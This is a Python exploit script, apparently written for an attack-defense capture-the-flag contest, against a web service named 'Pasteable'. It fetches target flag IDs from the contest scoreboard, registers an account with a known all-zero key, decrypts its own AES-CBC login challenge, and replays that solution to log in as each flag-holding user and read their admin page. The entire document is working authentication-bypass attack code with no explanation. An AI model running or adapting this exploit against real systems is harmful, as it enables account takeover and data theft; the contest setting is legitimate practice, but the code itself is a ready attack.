import requests
import random
import string
from Crypto.Cipher import AES
import json
import sys

randstr = lambda N: ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
ip = sys.argv[1]
url = f'http://{ip}:8080/'

def get_flag_ids():
    r = requests.get('https://scoreboard.ctf.saarland/attack.json')
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)

flagsss = get_flag_ids()['flag_ids']['Pasteable'][ip].values()
for flag_id in flagsss:
    s1 = requests.Session()
    s2 = requests.Session()

    user = randstr(10)
    password = "0000000000000000000000000000000000000000000000000000000000000000"
    data = {"username": user, "password": password}
    s1.post(url + "/func/register.php", data=data, allow_redirects=False)

    data = {"username": user}
    r = s1.post(url + "/func/challenge.php", data=data, allow_redirects=False)
    out1 = r.text

    data = {"username": flag_id}
    r = s2.post(url + "/func/challenge.php", data=data, allow_redirects=False)
    out2 = r.text


    key1 = bytes.fromhex(password)
    iv = key1[:16]

    cipher = AES.new(key1, AES.MODE_CBC, iv)
    challenge = cipher.decrypt(bytes.fromhex(out1)).decode().strip()
    print(challenge)

    # login on flag id session s2
    data = {"username": flag_id, "solution": challenge}
    s2.post(url + "/func/login.php", data=data, allow_redirects=False)
    r = s2.get(url + "admin/home/index.php", allow_redirects=False)
    print(r.text)
